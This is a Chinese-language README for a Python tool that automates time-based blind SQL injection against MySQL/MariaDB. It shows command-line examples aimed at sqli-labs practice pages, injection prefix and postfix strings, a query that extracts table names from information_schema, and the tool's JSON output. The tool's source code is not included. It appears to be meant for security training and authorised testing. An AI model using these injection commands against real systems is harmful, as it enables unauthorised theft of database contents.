# TimeBlindSQLScanner
🕰️ TBSQL-Automator: 时间盲注自动化工具

 简介

`TBSQL-Automator` 是一个基于 Python 的命令行工具，专为自动化执行 时间盲注 (Time-Based Blind SQL Injection) 攻击而设计。本工具通过精确测量服务器响应时间来爆破（逐字符猜测）数据库名称、表名、列名以及数据，并将最终结果以结构化的 JSON 格式输出。

 🚀 功能特性

  * 完全自动化：自动猜解目标数据的长度，然后逐字符爆破。
  * 灵活配置：支持命令行参数配置 URL、延迟时间、SQL 闭合符号等。
  * 专业输出：结果以标准的 JSON 格式输出，便于与其他工具或系统集成。
  * 自定义字符集：支持自定义爆破字符集，提高效率和灵活性。
  * 通用性强：适用于 MySQL/MariaDB 等支持 `IF` 和 `SLEEP()` 函数的数据库。

 🛠️ 安装与要求

本工具依赖 Python 3 和 `requests` 库。

1.  安装 Python 环境: 确保您的系统安装了 Python 3。
2.  安装依赖库:
    ```bash
    pip install requests
    ```

 📝 使用指南

 基本用法

您必须使用 `-u` 或 `--url` 参数来指定靶场 URL。

```bash
python tbsql_automator.py -u [目标URL]
```

 示例 1: 提取当前数据库名称

默认查询是 `select database()`，默认延迟时间为 5 秒。

```bash
python tbsql_automator.py -u "http://localhost:8080/Less-10/" 
```

 示例 2: 提取特定表名和自定义参数

假设靶场使用单引号闭合，且需要更长的延迟时间来稳定判断（例如 8 秒）：

```bash
python tbsql_automator.py \
    -u "http://example.com/Less-9/" \
    -s 8 \
    --prefix "' and " \
    --postfix " #" \
    -q "select group_concat(table_name) from information_schema.tables where table_schema='security'"
```

 ⚙️ 命令行参数

| 参数名 | 短参 | 类型 | 默认值 | 描述 |
| :--- | :--- | :--- | :--- | :--- |
| `--url` | `-u` | 字符串 | (必填) | 目标 URL (例如: `http://target/page.php?id=1`)。 |
| `--sleep-time` | `-s` | 整数 | `5` | 条件为真时服务器暂停的秒数。 |
| `--query` | `-q` | 字符串 | `select database()` | 要执行和提取数据的 SQL 查询语句。 |
| `--prefix` | | 字符串 | `"` `and` | SQL 注入前缀（闭合原语句），例如 ` ' and  ` 或 `"` ` and  `。 |
| `--postfix` | | 字符串 | `  -- - ` | SQL 注入后缀（注释），例如 `  -- - ` 或 `  # `。 |
| `--max-length` | | 整数 | `20` | 要猜测的数据最大长度。 |
| `--chars` | | 字符串 | (默认字符集) | 用于爆破的字符集。 |

 📦 JSON 输出格式

脚本运行结束后，将输出以下结构的 JSON 数据，便于程序解析：

```json
{
    "status": "success",
    "configuration": {
        "url": "...",
        "query": "select database()",
        "prefix": "\" and",
        "postfix": "-- -",
        "sleep_time": 5
    },
    "result": {
        "data": "security",
        "length": 8
    }
}
```

⚠️ 免责声明

本工具仅供网络安全学习、研究和授权的渗透测试使用。禁止将本工具用于任何非法用途。作者不对任何滥用本工具的行为负责。
